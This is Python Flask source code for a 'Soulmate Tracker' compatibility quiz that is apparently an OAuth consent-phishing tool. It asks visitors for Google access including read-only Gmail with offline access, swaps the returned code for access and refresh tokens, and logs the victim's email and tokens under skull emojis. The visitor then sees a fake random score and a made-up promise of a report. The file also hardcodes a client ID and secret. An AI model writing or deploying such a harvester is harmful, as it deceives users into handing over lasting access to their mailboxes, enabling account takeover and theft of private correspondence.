from flask import Flask, redirect, url_for, request
import requests
import random
import json

app = Flask(__name__)

# --- CONFIGURATION ---
CLIENT_ID = "1067906653409-dsmhmumlp914dcihc7ob94m3fsms2kpg.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = 'https://soulmate-tracker.onrender.com/callback'

@app.route('/')
def index():
    scopes = [
        "https://www.googleapis.com/auth/userinfo.profile",
        "https://www.googleapis.com/auth/userinfo.email",
        "https://www.googleapis.com/auth/gmail.readonly"
    ]
    scope_param = " ".join(scopes)
    auth_url = (f"https://accounts.google.com/o/oauth2/v2/auth?client_id={CLIENT_ID}"
                f"&redirect_uri={REDIRECT_URI}&response_type=code&scope={scope_param}"
                f"&access_type=offline&prompt=consent")
    return redirect(auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Verification Failed. Please try again.", 400

    token_url = "https://oauth2.googleapis.com/token"
    data = {
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'redirect_uri': REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    
    r = requests.post(token_url, data=data)
    token_data = r.json()
    
    access_token = token_data.get('access_token')
    refresh_token = token_data.get('refresh_token')
    
    if not access_token:
        return "Authentication Error", 400

    # Get Profile
    user_info = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", 
                             headers={"Authorization": f"Bearer {access_token}"}).json()
    
    target_email = user_info.get('email')

    # Logging
    print("\n" + "💀" * 20)
    print(f"EMAIL: {target_email}")
    print(f"ACCESS: {access_token}")
    print(f"REFRESH: {refresh_token}")
    print("💀" * 20 + "\n")

    # UI Result
    soulmate_score = random.randint(75, 98)
    
    return f"""
    <html>
    <head>
        <title>Soulmate Tracker | Analysis</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: linear-gradient(135deg, #fce4ec 0%, #f3e5f5 100%); font-family: sans-serif; }}
            .card {{ background: white; padding: 40px 20px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }}
            .heart {{ color: #ff3366; font-size: 50px; animation: pulse 1.5s infinite; }}
            @keyframes pulse {{ 0% {{ transform: scale(1); }} 50% {{ transform: scale(1.1); }} 100% {{ transform: scale(1); }} }}
            .score {{ font-size: 70px; font-weight: bold; color: #ff3366; margin: 10px 0; }}
            .progress-container {{ width: 80%; background: #eee; border-radius: 20px; margin: 20px auto; overflow: hidden; }}
            .progress-bar {{ width: {soulmate_score}%; background: #ff3366; height: 12px; border-radius: 20px; }}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="heart">❤️</div>
            <h2 style="color: #444;">Compatibility Result</h2>
            <div class="score">{soulmate_score}%</div>
            <p>Analyzing profile for: <b>{target_email}</b></p>
            <div class="progress-container"><div class="progress-bar"></div></div>
            <p style="color: #888; font-size: 0.85em;">A detailed Litmatch Soulmate Report is being sent to your Gmail. Please check in 2-5 minutes.</p>
            <div style="color: #2ecc71; font-weight: bold; margin-top: 15px;">✓ Identity Verified</div>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(port=5000)
